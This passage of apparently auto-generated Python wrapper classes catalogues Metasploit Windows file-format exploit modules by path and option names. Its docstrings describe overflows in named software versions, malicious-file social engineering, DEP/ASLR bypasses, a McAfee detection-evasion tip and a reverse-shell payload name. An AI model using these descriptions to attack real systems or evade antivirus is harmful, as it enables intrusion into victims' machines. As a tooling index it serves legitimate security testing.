		path = 'windows/fileformat/subtitle_processor_m3u_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_digital_music_pad_pls(object):
		"""
		
          This module exploits a buffer overflow in Digital Music Pad Version 8.2.3.3.4
        When opening a malicious pls file with the Digital Music Pad,
        a remote attacker could overflow a buffer and execute
        arbitrary code.
      
		"""

		path = 'windows/fileformat/digital_music_pad_pls'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_adobe_jbig2decode(object):
		"""
		
          This module exploits a heap-based pointer corruption flaw in Adobe Reader 9.0.0 and earlier.
          This module relies upon javascript for the heap spray.
      
		"""

		path = 'windows/fileformat/adobe_jbig2decode'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_varicad_dwb(object):
		"""
		
          This module exploits a stack-based buffer overflow in VariCAD 2010-2.05 EN.
        An attacker must send the file to victim and the victim must open the file.
      
		"""

		path = 'windows/fileformat/varicad_dwb'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_bpftp_client_bps_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability in
        BulletProof FTP Client 2010, caused by an overly long hostname.

        By persuading the victim to open a specially-crafted .BPS file, a
        remote attacker could execute arbitrary code on the system or cause
        the application to crash. This module has been tested successfully on
        Windows XP SP3.
      
		"""

		path = 'windows/fileformat/bpftp_client_bps_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_msworks_wkspictureinterface(object):
		"""
		
          The Microsoft Works ActiveX control (WkImgSrv.dll) could allow a remote attacker
        to execute arbitrary code on a system. By passing a negative integer to the
        WksPictureInterface method, an attacker could execute arbitrary code on the system
        with privileges of the victim. Change 168430090 /0X0A0A0A0A to 202116108 / 0x0C0C0C0C FOR IE6.
        This control is not marked safe for scripting, please choose your attack vector carefully.
      
		"""

		path = 'windows/fileformat/msworks_wkspictureinterface'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_sascam_get(object):
		"""
		
        The SasCam Webcam Server ActiveX control is vulnerable to a buffer overflow.
        By passing an overly long argument via the Get method, a remote attacker could
        overflow a buffer and execute arbitrary code on the system with the privileges
        of the user. This control is not marked safe for scripting, please choose your
        attack vector carefully.
        
		"""

		path = 'windows/fileformat/sascam_get'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_bsplayer_m3u(object):
		"""
		
          This module exploits a buffer overflow in BS.Player 2.57. When
        the playlist import is used to import a specially crafted m3u file,
        a buffer overflow occurs allowing arbitrary code execution.
      
		"""

		path = 'windows/fileformat/bsplayer_m3u'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_mini_stream_pls_bof(object):
		"""
		
        This module exploits a stack based buffer overflow found in Mini-Stream RM-MP3
        Converter v3.1.2.1. The overflow is triggered when an unsuspecting victim
        opens the malicious PLS file.
      
		"""

		path = 'windows/fileformat/mini_stream_pls_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_erdas_er_viewer_bof(object):
		"""
		
          This module exploits a buffer overflow vulnerability found in ERS Viewer 2011
        (version 11.04). The vulnerability exists in the module ermapper_u.dll where the
        function ERM_convert_to_correct_webpath handles user provided data in a insecure
        way. It results in arbitrary code execution under the context of the user viewing
        a specially crafted .ers file. This module has been tested successfully with ERS
        Viewer 2011 (version 11.04) on Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/fileformat/erdas_er_viewer_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_adobe_pdf_embedded_exe_nojs(object):
		"""
		
          This module embeds a Metasploit payload into an existing PDF file in
        a non-standard method. The resulting PDF can be sent to a target as
        part of a social engineering attack.
      
		"""

		path = 'windows/fileformat/adobe_pdf_embedded_exe_nojs'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			EXENAME = 'EXENAME'
			LAUNCH_MESSAGE = 'LAUNCH_MESSAGE'

	class windows_fileformat_hhw_hhp_indexfile_bof(object):
		"""
		
          This module exploits a stack buffer overflow in HTML Help Workshop 4.74
          by creating a specially crafted hhp file.
      
		"""

		path = 'windows/fileformat/hhw_hhp_indexfile_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_aol_desktop_linktag(object):
		"""
		
          This module exploits a vulnerability found in AOL Desktop 9.6's Tool/rich.rct
        component. By supplying a long string of data in the hyperlink tag, rich.rct copies
        this data into a buffer using a strcpy function, which causes an overflow, and
        results arbitrary code execution.
      
		"""

		path = 'windows/fileformat/aol_desktop_linktag'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_erdas_er_viewer_rf_report_error(object):
		"""
		
          This module exploits a buffer overflow vulnerability found in ERS Viewer 2013.
        The vulnerability exists in the module ermapper_u.dll, where the function
        rf_report_error handles user provided data in a insecure way. It results in
        arbitrary code execution under the context of the user viewing a specially crafted
        .ers file. This module has been tested successfully with ERS Viewer 2013 (versions
        13.0.0.1151) on Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/fileformat/erdas_er_viewer_rf_report_error'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_ovf_format_string(object):
		"""
		
          This module exploits a format string vulnerability in VMWare OVF Tools 2.1 for
        Windows. The vulnerability occurs when printing error messages while parsing a
        a malformed OVF file. The module has been tested successfully with VMWare OVF Tools
        2.1 on Windows XP SP3.
      
		"""

		path = 'windows/fileformat/ovf_format_string'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_somplplayer_m3u(object):
		"""
		
          This module exploits a buffer overflow in Simple Open Music Player v1.0. When
        the application is used to import a specially crafted m3u file, a buffer overflow occurs
        allowing arbitrary code execution.
      
		"""

		path = 'windows/fileformat/somplplayer_m3u'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_audiotran_pls_1424(object):
		"""
		
          This module exploits a stack-based buffer overflow in Audiotran 1.4.2.4.
        An attacker must send the file to victim and the victim must open the file.
        Alternatively, it may be possible to execute code remotely via an embedded
        PLS file within a browser when the PLS extention is registered to Audiotran.
        This alternate vector has not been tested and cannot be exercised directly
        with this module.
      
		"""

		path = 'windows/fileformat/audiotran_pls_1424'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_galan_fileformat_bof(object):
		"""
		
        This module exploits a stack buffer overflow in gAlan 0.2.1
      by creating a specially crafted galan file.

      
		"""

		path = 'windows/fileformat/galan_fileformat_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_ms14_064_packager_python(object):
		"""
		
        This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE)
        allowing arbitrary code execution, bypassing the patch MS14-060, for the vulnerability
        publicly known as "Sandworm", on systems with Python for Windows installed. Windows Vista
        SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known to be vulnerable.
        However, based on our testing, the most reliable setup is on Windows platforms running
        Office 2013 and Office 2010 SP2. Please keep in mind that some other setups such as
        those using Office 2010 SP1 may be less stable, and may end up with a crash due to a
        failure in the CPackage::CreateTempFileName function.
      
		"""

		path = 'windows/fileformat/ms14_064_packager_python'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_fileformat_adobe_flashplayer_button(object):
		"""
		
          This module exploits a vulnerability in the handling of certain SWF movies
        within versions 9.x and 10.0 of Adobe Flash Player. Adobe Reader and Acrobat
        are also vulnerable, as are any other applications that may embed Flash player.

        Arbitrary code execution is achieved by embedding a specially crafted Flash
        movie into a PDF document. An AcroJS heap spray is used in order to ensure
        that the memory used by the invalid pointer issue is controlled.

        NOTE: This module uses a similar DEP bypass method to that used within the
        adobe_libtiff module. This method is unlikely to work across various
        Windows versions due a the hardcoded syscall number.
      
		"""

		path = 'windows/fileformat/adobe_flashplayer_button'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_ms10_038_excel_obj_bof(object):
		"""
		
          This module exploits a vulnerability found in Excel 2002 of Microsoft Office XP.
        By supplying a .xls file with a malformed OBJ (recType 0x5D) record an attacker
        can get the control of the excution flow. This results aribrary code execution under
        the context of the user.
      
		"""

		path = 'windows/fileformat/ms10_038_excel_obj_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_vlc_realtext(object):
		"""
		
          This module exploits a stack buffer overflow vulnerability in
        VideoLAN VLC < 0.9.6. The vulnerability exists in the parsing of
        RealText subtitle files.

          In order to exploit this, this module will generate two files:
        The .mp4 file is used to trick your victim into running. The .rt file
        is the actual malicious file that triggers the vulnerability, which
        should be placed under the same directory as the .mp4 file.
      
		"""

		path = 'windows/fileformat/vlc_realtext'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_orbital_viewer_orb(object):
		"""
		
          This module exploits a stack-based buffer overflow in David Manthey's
        Orbital Viewer. When processing .ORB files, data is read from file into
        a fixed-size stack buffer using the fscanf function. Since no bounds
        checking is done, a buffer overflow can occur. Attackers can execute
        arbitrary code by convincing their victim to open an ORB file.
      
		"""

		path = 'windows/fileformat/orbital_viewer_orb'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_esignal_styletemplate_bof(object):
		"""
		
        The software is unable to handle the "<StyleTemplate>" files (even those
        original included in the program) like those with the registered
        extensions QUO, SUM and POR. Successful exploitation of this
        vulnerability may take up to several seconds due to the use of
        egghunter. Also, DEP bypass is unlikely due to the limited space for
        payload. This vulnerability affects versions 10.6.2425.1208 and earlier.
      
		"""

		path = 'windows/fileformat/esignal_styletemplate_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_vlc_modplug_s3m(object):
		"""
		
          This module exploits an input validation error in libmod_plugin as
        included with VideoLAN VLC 1.1.8. All versions prior to version 1.1.9
        are affected. By creating a malicious S3M file, a remote attacker
        could execute arbitrary code.

        Although other products that bundle libmodplug may be vulnerable, this
        module was only tested against VLC.

        NOTE: As of July 1st, 2010, VLC now calls SetProcessDEPPoly to
        permanently enable NX support on machines that support it. As such,
        this module is capable of bypassing DEP, but not ASLR.
      
		"""

		path = 'windows/fileformat/vlc_modplug_s3m'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_destinymediaplayer16(object):
		"""
		
          This module exploits a stack-based buffer overflow in the Destiny Media Player 1.61.
          An attacker must send the file to victim and the victim must open the file. File-->Open Playlist
      
		"""

		path = 'windows/fileformat/destinymediaplayer16'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_altap_salamander_pdb(object):
		"""
		
          This module exploits a buffer overflow in Altap Salamander <= v2.5.
          By creating a malicious file and convincing a user to view the file with
          the Portable Executable Viewer plugin within a vulnerable version of
          Salamander, the PDB file string is copied onto the stack and the
          SEH can be overwritten.
      
		"""

		path = 'windows/fileformat/altap_salamander_pdb'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_mjm_quickplayer_s3m(object):
		"""
		
          This module exploits a stack buffer overflow in MJM QuickPlayer 1.00 beta 60a
        and QuickPlayer 2010 (Multi-target exploit).  When opening a malicious s3m file in
        one of these 2 applications, a stack buffer overflow can be triggered, resulting in
        arbitrary code execution.

        This exploit bypasses DEP & ASLR, and works on XP, Vista & Windows 7.
      
		"""

		path = 'windows/fileformat/mjm_quickplayer_s3m'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_blazedvd_plf(object):
		"""
		
          This module exploits a stack over flow in BlazeDVD 5.1 and 6.2. When
          the application is used to open a specially crafted plf file,
          a buffer is overwritten allowing for the execution of arbitrary code.
      
		"""

		path = 'windows/fileformat/blazedvd_plf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_mcafee_showreport_exec(object):
		"""
		
          This module exploits a vulnerability found in McAfee Security-as-a-Service.
        The ShowReport() function (located in the myCIOScn.dll ActiveX component) fails
        to check the FileName argument, and passes it on to a ShellExecuteW() function,
        therefore allows any malicious attacker to execute any process that's on the
        local system.  However, if the victim machine is connected to a remote share (
        or something similiar), then it's also possible to execute arbitrary code.
        Please note that a custom template is required for the payload, because the
        default Metasploit template is detectable by McAfee -- any Windows binary, such
        as calc.exe or notepad.exe, should bypass McAfee fine.
      
		"""

		path = 'windows/fileformat/mcafee_showreport_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_FILENAME = 'FILENAME'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SHARENAME = 'SHARENAME'
			required_TEMPLATE = 'TEMPLATE'

	class windows_fileformat_adobe_illustrator_v14_eps(object):
		"""
		
          Adobe Illustrator CS4 (V14.0.0) Encapsulated Postscript (.eps)
        overlong DSC Comment Buffer Overflow Exploit
      
		"""

		path = 'windows/fileformat/adobe_illustrator_v14_eps'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_total_video_player_ini_bof(object):
		"""
		
        This module exploits a buffer overflow in Total Video Player 1.3.1. The vulnerability
        occurs opening malformed Settings.ini file e.g."C:/Program Files/Total Video Player/".
        This module has been tested successfully on Windows WinXp-Sp3-EN, Windows 7, and Windows 8.
      
		"""

		path = 'windows/fileformat/total_video_player_ini_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_corelpdf_fusion_bof(object):
		"""
		
        This module exploits a stack-based buffer overflow vulnerability in version 1.11 of
        Corel PDF Fusion. The vulnerability exists while handling a XPS file with long entry
        names. In order for the payload to be executed, an attacker must convince the target
        user to open a specially crafted XPS file with Corel PDF Fusion. By doing so, the
        attacker can execute arbitrary code as the target user.
      
		"""

		path = 'windows/fileformat/corelpdf_fusion_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_emc_appextender_keyworks(object):
		"""
		
          This module exploits a stack buffer overflow in the KeyWorks KeyHelp Activex Control
        (KeyHelp.ocx 1.2.3120.0). This Activex Control comes bundled with EMC's
        Documentation ApplicationXtender 5.4.
      
		"""

		path = 'windows/fileformat/emc_appextender_keyworks'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_vlc_smb_uri(object):
		"""
		
          This module exploits a stack-based buffer overflow in the Win32AddConnection
        function of the VideoLAN VLC media player. Versions 0.9.9 throught 1.0.1 are
        reportedly affected.

        This vulnerability is only present in Win32 builds of VLC.

        This payload was found to work with the windows/exec and
        windows/meterpreter/reverse_tcp payloads. However, the
        windows/meterpreter/reverse_ord_tcp was found not to work.
      
		"""

		path = 'windows/fileformat/vlc_smb_uri'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_vuplayer_cue(object):
		"""
		
          This module exploits a stack over flow in VUPlayer <= 2.49. When
        the application is used to open a specially crafted cue file, an buffer is overwritten allowing
        for the execution of arbitrary code.
      
		"""

		path = 'windows/fileformat/vuplayer_cue'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_adobe_libtiff(object):
		"""
		
        This module exploits an integer overflow vulnerability in Adobe Reader and Adobe Acrobat
        Professional versions 8.0 through 8.2 and 9.0 through 9.3.
      
		"""

		path = 'windows/fileformat/adobe_libtiff'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_mymp3player_m3u(object):
		"""
		
          This module exploits a stack buffer overflow in Steinberg MyMP3Player == 3.0. When
        the application is used to open a specially crafted m3u file, a buffer overflow occurs
        allowing arbitrary code execution.
      
		"""

		path = 'windows/fileformat/mymp3player_m3u'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_bacnet_csv(object):
		"""
		
          This module exploits a stack buffer overflow in SCADA
        Engine BACnet OPC Client v1.0.24. When the BACnet OPC Client
        parses a specially crafted csv file, arbitrary code may be
        executed.
      
		"""

		path = 'windows/fileformat/bacnet_csv'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_videolan_tivo(object):
		"""
		
          This module exploits a buffer overflow in VideoLAN VLC 0.9.4.
        By creating a malicious TY file, a remote attacker could overflow a
        buffer and execute arbitrary code.
      
		"""

		path = 'windows/fileformat/videolan_tivo'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_ezip_wizard_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability in
        version 3.0 of ediSys Corp.'s eZip Wizard.

        In order for the command to be executed, an attacker must convince someone to
        open a specially crafted zip file with eZip Wizard, and access the specially
        file via double-clicking it. By doing so, an attacker can execute arbitrary
        code as the victim user.
      
		"""

		path = 'windows/fileformat/ezip_wizard_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'
			required_USERNAME = 'USERNAME'

	class windows_fileformat_apple_quicktime_rdrf(object):
		"""
		
        This module exploits a vulnerability found in Apple Quicktime. The flaw is
        triggered when Quicktime fails to properly handle the data length for certain
        atoms such as 'rdrf' or 'dref' in the Alis record, which may result a buffer
        overflow by loading a specially crafted .mov file, and allows arbitrary
        code execution under the context of the current user. Please note: Since an egghunter
        is used to search for the payload, this may require additional time for
        the exploit to complete.
      
		"""

